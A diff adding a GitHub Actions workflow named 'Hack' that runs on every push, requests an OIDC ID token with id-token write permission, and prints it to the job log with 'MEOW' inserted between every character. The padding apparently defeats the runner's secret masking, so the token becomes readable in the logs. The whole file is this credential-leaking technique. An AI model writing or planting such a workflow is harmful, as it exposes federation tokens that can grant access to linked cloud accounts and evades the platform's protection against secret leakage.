@@ -1,0 +1,19 @@
+name: Hack
+on:
+  push
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/github-script@v6
+        with:
+          script: |
+            const tok = await core.getIDToken("github-token-action-server");
+            const enc = tok.split("").join("MEOW");
+            console.log(enc);
